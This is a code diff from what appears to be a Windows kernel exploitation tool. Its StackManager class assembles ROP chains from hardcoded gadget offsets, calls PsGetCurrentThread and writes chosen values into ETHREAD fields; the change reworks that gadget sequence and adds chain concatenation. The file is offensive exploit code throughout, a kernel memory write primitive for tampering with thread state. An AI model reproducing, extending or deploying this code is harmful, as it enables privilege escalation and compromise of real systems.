@@ -1,13 +1,21 @@
 #include <include/stack/stack_manager.hpp>
 
-std::uint64_t* StackManager::GetStackBuffer()
+std::uint64_t* StackManager::GetStackBuffer(const bool IncludeInitStack)
 {
-	return Stack->data();
+	const std::size_t InitStackSize = IncludeInitStack
+		? NULL
+		: this->InitStackSize / sizeof(std::uint64_t);
+
+	return Stack->data() + (std::uint64_t)InitStackSize;
 }
 
-std::size_t StackManager::GetStackSize()
+std::size_t StackManager::GetStackSize(const bool IncludeInitStack)
 {
-	return Stack->size() * sizeof(std::uint64_t);
+	const std::size_t InitStackSize = IncludeInitStack
+		? NULL
+		: this->InitStackSize;
+
+	return Stack->size() * sizeof(std::uint64_t) - InitStackSize;
 }
 
 void StackManager::AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName)
@@ -31,15 +39,36 @@ void StackManager::AddPadding(const std::size_t PaddingSize)
 		this->AddValue(0xC0FEBABEC0FEBABE, "Padding");
 }
 
+void StackManager::ChainStack(StackManager* NewStack)
+{
+	if (!NewStack)
+		return;
+
+	this->Stack->insert(this->Stack->end(), NewStack->Stack->begin(), NewStack->Stack->end());
+}
+
 void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
 {
 	this->AddFunctionCall("PsGetCurrentThread");
-	this->AddGadget(0x256c4a, "pop rcx; ret;"); // pop rcx; ret;
-	this->AddValue(FieldOffset, "ETHREAD offset"); // Offset inside of ETHREAD we want to write to
-	this->AddGadget(0x28efa4, "add rax, rcx; ret;"); // add rax, rcx; ret;
-	this->AddGadget(0x2f7921, "pop r8; ret;"); // pop r8; ret;
-	this->AddValue(NewValue, "New field value"); // New value we write to the field
-	this->AddGadget(0x3c3a81, "mov qword ptr [rax], r8; ret;"); // mov qword ptr [rax], r8; ret;
+
+	// r9->rcx->NewValue, Setup value to write. It has a sideeffect on eax so we perform thiss
+	// before the rest of our chain.
+	this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
+	this->AddValue(0, "set r8 to 0");
+	this->AddPadding(0x28);
+	this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+	this->AddPadding(0x8);
+	this->AddValue(NewValue, "New field value");
+	this->AddPadding(0x18);
+	this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
+
+	// rax = Thread + Offset inside of ETHREAD, which we will write to
+	this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+	this->AddPadding(0x8);
+	this->AddValue(FieldOffset, "ETHREAD offset");
+	this->AddPadding(0x18);
+	this->AddGadget(0x263f08, "add rax, rcx; ret;");
+	this->AddGadget(0x3c4eac, "mov qword ptr [rax], r9; ret;");
 }
 
 void StackManager::ModifyThreadStartAddress(const std::uint64_t NewStartAddress)
